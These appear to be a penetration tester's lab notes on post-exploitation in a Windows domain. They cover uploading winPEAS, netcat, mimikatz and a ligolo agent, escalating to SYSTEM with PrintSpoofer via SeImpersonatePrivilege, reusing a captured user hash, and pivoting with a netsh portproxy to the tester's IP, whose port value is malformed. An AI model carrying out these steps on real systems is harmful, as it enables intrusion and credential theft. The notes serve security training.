- After getting a secure shell, I then uploaded my scripts to further enumerate such as winPEASany, nc.exe, agent.exe to secure my ligolo connection, mimikatz.exe
- winPEAS showed me there was an seImpersonatePrivilege which lead to me to PrintSpoofer64.exe, which allows me to become a system shell.
- Uploaded PrintSpoofer64.exe, then looked at my ipconfig table to see if it was connected to MS02.
- PowerView can help too to enumerate Domain Users because we had a user, Mary Williams but she was not a part of the DC, we got a hash for celia.almeda who was authenticated to the DC
- On Ligolo Proxy, I added the subnet that MS02 was a part of

- I set up a listener agent that would catch anything listening on 0.0.0.0 on port 4444 to then forward to my local interface at 127.0.0.1 on port 4444
- I also created a port proxy as well just in case, may go back over again to verify this is needed or not.
- netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4.4.4.4 connectaddress=192.168.45.241(myIP) connectport=4444
- netsh interface portproxy show v4tov4 to verify syntax worked
